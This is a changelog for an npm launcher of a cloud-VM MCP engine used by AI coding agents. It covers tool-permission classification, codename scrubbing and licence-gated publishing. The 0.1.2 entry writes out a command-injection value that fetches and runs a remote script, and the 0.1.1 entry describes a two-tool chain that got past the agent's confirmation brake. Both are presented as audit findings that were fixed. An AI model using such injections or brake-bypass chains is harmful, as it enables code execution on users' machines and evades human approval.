# Changelog — @dzhechkov/cloudru-hub

## 0.1.6

Corrects the link added in 0.1.5: the Тимур credit now points at his about page
(https://shkrbkv.ru/about/), not at a single note. The 0.1.5 entry below is left as written — it
records what that release actually shipped, and a dated entry is not rewritten to hide a wrong link.

## 0.1.5

Attribution only, no code change. Both README mentions of Тимур — the Hermes engine author whose
grant satisfied the ADR-001 licence hold — now link to his site
(https://shkrbkv.ru/notes/agent-guardrails/), so the credit on the npm page points at the person
rather than just naming him. The LICENSE grant record and the historical changelog entries are left
exactly as written: a licence text and a dated record are not places to retrofit links.

## 0.1.4 — 2026-08-12 (FIRST PUBLICATION — ADR-001 hold satisfied, AM-2)

- **The licence hold is SATISFIED and the pack is published.** Тимур — the author of the
  Hermes engine additions (built on the owner's original Go CLI foundation, ADR-001
  AM-1) — approved publication; owner-reported 2026-08-12, recorded in
  `features/hermes-claude-adaptation/03_adr/grant-record-2026-08-12.md` (linked from the
  LICENSE `Grant-Confirmation:` line). Honesty: the approval is owner-attested; archiving
  the author's written confirmation is a recorded owner follow-up. No licence is
  fabricated on the author's behalf: the pack still ships ZERO engine-addition bytes,
  `license: MIT` covers only the owner's code, and LICENSE Part 2 explicitly grants no
  third-party rights to the engine additions.
- Hold mechanics flipped legitimately, not cosmetically: `private:true` and the PENDING
  placeholder removed; the `licenseHold` trigger field deliberately KEPT (per the
  `dz guard` `licence-hold` rule design a satisfied hold passes with the trigger in
  place, so the rule keeps verifying LICENSE/NOTICES/SPDX on every future publish).
- Hold-era pack tests replaced by post-grant invariants: honest grant wording
  (owner-attested, no fabricated grant deed), Grant-Confirmation URL present, author
  attribution by name, licenseHold-stays-declared, SPDX-matches-LICENSE (the ADR-001
  Confirmation test), publishable-state. Mutation registry entries updated in kind
  (`licence-publishable-state-asserted`, `licence-spdx-matches-license-file`;
  the LICENSE file itself is not gate-mutable — extensionless, no parser — so the
  Grant-Confirmation content is covered by the pack tests + the guard rule directly).
  Suite 71 → 70 tests (the npm-layer EPRIVATE probe retired with `private:true`);
  mutation gate 13/13 PROVEN (MEASURED — 2026-08-12).
- NOT in this release: the binary-carrying platform package
  `@dzhechkov/cloudru-vm-linux-x64` (ADR-002 trusted-CI build + go-licenses
  reconciliation still required before its first publication).

## 0.1.3 — 2026-08-10 (still HELD unpublished — ADR-001; Variant A binary-name leak scrubs)

- **LOW, dialect compiler — the engine binary name `cloudru-vm` handled by targeted leak-form
  SCRUBS, deliberately NOT by the codename net.** The bare token is ALSO the legitimate MCP
  server name that MUST appear in output — PROVEN before coding: `\bcloudru-vm\b` matches the
  compiler's OWN injected tool_search prose `сервера cloudru-vm видны` (over-block), and
  `mcp__cloudru-vm__` is spared only because `_` is a word char. So `forbiddenCodenames` is
  unchanged; instead both targets (claude-code, codex) gain two ordered replacements placed
  AFTER the longer `cloudru-vm-cli` scrub: (1) dotted config path `\.cloudru-vm(?![\w-])` →
  `.cloudru-hub` (lookahead spares `.cloudru-vm-cli`); (2) CLI invocation
  `\bcloudru-vm[ \t]+(?=(?:deploy|status|logs|destroy|verify|init|version|list-zones|list-images|mcp|doctor)\b)`
  → `cloudru-hub ` — the verb alternation is the engine's REAL cobra command set, cited from
  the baseline `engine/cmd/cloudru-vm/main.go` AddCommand block (lines 53-65); `[ \t]+` (not
  `\s+`) so a line break is never joined, whole-word verbs so `cloudru-vm deployment` and
  Russian prose stay untouched. RED-before/GREEN-after pinned in tests (0.1.2 shipped
  `~/.cloudru-vm/config` and `cloudru-vm deploy` INTACT with ok=true — MEASURED); over-block
  guard test proves the MCP server prose + `mcp__cloudru-vm__stack_status` compile CLEAN and
  unrewritten; a verb-set test pins the alternation to the engine command set. Two mutation
  entries (`dialect-binary-path-leak-scrubbed`, `dialect-binary-invocation-leak-scrubbed`)
  keep each scrub RED when disarmed. Suite 66 → 71 tests; mutation gate 11 → 13 PROVEN.

## 0.1.2 — 2026-08-10 (still HELD unpublished — ADR-001; closes 2 re-QE residuals)

- **HIGH, ADR-004 AM-2 — `logs` reclassified allow→ask; the classification method gains a
  SECOND hazard axis (reaching a remote shell with a user-controlled argument).** The AM-1
  re-audit checked only "advances a job / spends money / returns a secret"; it did NOT
  check whether a tool passes a user arg into a remote shell. `logs` (classified `allow`)
  does — VERIFIED against the pinned baseline: `handleLogs` (`tools.go:1758`) passes the
  user `service` arg to `engine.Logs`, which concatenates it RAW into
  `cmd += " " + opts.Service` (`engine/logs.go:61`) → `Deployer.Exec` (`logs.go:64`) → SSH
  `session.CombinedOutput` (`internal/deploy/ssh.go:117`). So `service="app; curl evil | sh"`
  is arbitrary RCE on the user's VM behind a silent `allow`. Re-audited ALL 78 allow tools
  against the new axis: `logs` is the ONLY shell-reaching allow tool (every other shell
  site — `vm_exec`, `deploy`, `deploy_apply`/captainkeys, `k8s_kubectl`/`k8s_apply`/`k8s_helm`
  — is already `ask`). New golden split: 65 ask / 2 deny / 77 allow. Invariant pinned
  layer-1: `logs===ask` test, method-doc-documents-shell-reach test, no-allow-admits-shell-reach
  test, mutation-registry entry `brake-logs-stays-ask`. Engine injection flagged to the
  author (ADR-004 AM-2; licence-blocked, not fixed here).
- **LOW, dialect compiler — codename allowlist expanded to the full engine identity.**
  `forbiddenCodenames` covered only `hermes`; the tokens `dzhechko` (go-module owner),
  `cloudru-vm-cli` (CLI name), and `captainkeys` (`captainkeys.go`) compiled CLEAN
  (VERIFIED). Now all four are gated, case-insensitive, with WORD-BOUNDARY matching (not
  substring): necessary because a raw `dzhechko` substring over-blocks the legitimately
  published scope `@dzhechkov` (= `dzhechko`+`v`), and word boundaries also drop harmless
  `thermes`-class false positives without weakening the net against any observed real leak
  shape (`~/.hermes/`, `hermes-agent`, prose "Hermes", Cyrillic-suffixed `hermesовский`).
  Each identity token gets a scrub replacement (go-module path → published package name);
  the real corpus still compiles with 0 survivors on both targets (MEASURED). Mutation
  entry `dialect-codename-gate-armed` updated for the expanded list, stays RED when emptied.
- Tests 58 → 66 (MEASURED — `node --test 'test/*.test.mjs'`); mutation gate 10/10 → 11/11
  PROVEN (MEASURED — `dz mutation-gate --package packages/@dzhechkov/cloudru-hub`).

## 0.1.1 — 2026-08-10 (still HELD unpublished — ADR-001; closes 2 cross-model QE findings)

- **HIGH (false-safe), ADR-004 AM-1 — `stack_status` reclassified allow→ask, and the
  classification METHOD corrected.** `handleStackStatus` (`tools_stack.go:451`) advances
  planned/running jobs (`:479-484` → `advance` → `s.callTool` `:220`), invoking the paid
  create tools with no confirmation — LIVE-REPRODUCED against the pinned baseline: one
  `stack_status` call moved a planned job `planned→running` and attempted `provision`
  twice (stopped only at AUTH_REQUIRED), so the fully-allow chain
  `stack_plan→stack_status` defeated the brake with zero prompts. All 79 former allow
  tools re-audited against actual engine handler BEHAVIOUR (not schema shape); 78
  confirmed genuinely read-only (each entry's `why` now cites the handler file:line),
  `stack_plan`/`deploy_plan` verified to create nothing (LOCAL plan file only). New
  golden split: 64 ask / 2 deny / 78 allow. Invariant pinned layer-1: `stack_status===ask`
  test, allow-requires-behaviour-audit test, mutation-registry entry
  `brake-stack-status-stays-ask`.
- **MEDIUM, dialect compiler — positive codename invariant.** The 8-token denylist let
  the bare codename and the `~/.hermes/` path through (real-corpus compile returned
  `ok=true` with 5 case-insensitive survivors — MEASURED). `compileSkill` now hard-fails
  on ANY case-insensitive codename occurrence in ANY emitted file
  (`data/dialects.json.forbiddenCodenames`), with scrub replacements for the observed
  leak shapes (`~/.hermes/` path, `hermes-agent` example name, 2 prose mentions); the
  real corpus now compiles with 0 survivors on both targets (MEASURED). Mutation-registry
  entry `dialect-codename-gate-armed`.
- Tests 52 → 58 (MEASURED — `node --test 'test/*.test.mjs'`); mutation gate 8/8 → 10/10
  PROVEN (MEASURED — `dz mutation-gate --package packages/@dzhechkov/cloudru-hub`).

## 0.1.0 — 2026-08-10 (prepared, HELD unpublished — ADR-001)

Initial build of the npm launcher for the `cloudru-vm` MCP engine, per
`features/hermes-claude-adaptation/` ADR-001/002/004/005/006/010.

- Launcher with runtime engine resolution (env → config → optional platform package),
  sha256 pin verification against the 0.2.3-20260718 baseline; `resolve`, `self-test`,
  `mcp`, `install`, `compile-skill` commands.
- ADR-004 brake: golden classification of all 144 engine tools (63 ask / 2 deny /
  79 allow — MEASURED, `data/tools-classification.json`), permission-rule emission in
  both mcp__ prefix spellings, PreToolUse ssh-guard + kubectl-rollout veto with an
  EXECUTED install-time probe.
- ADR-005 tiering: claude-code full / codex plan-only / degraded refused /
  agents-md+gemini pointer-only (≤2048 chars, mandatory no-veto warning).
- ADR-006 dialect compiler: config-driven target variants, forbidden-token hard gate,
  dangling-link unlinking, 12 000-char lossy router cap, byte-deterministic.
- Publish hold armed three ways: `private:true` (npm layer), the `dz guard`
  `licence-hold` HARD rule (harness-core), and mutation-gate entries 8/8 PROVEN
  (MEASURED — `dz mutation-gate --package packages/@dzhechkov/cloudru-hub`, 2026-08-10).
- 52 tests (MEASURED — `node --test 'test/*.test.mjs'`, 52/52 pass, 2026-08-10).
- NOT published: LICENSE Part 2 carries the pending-grant placeholder; see README
  "Post-grant publish checklist".
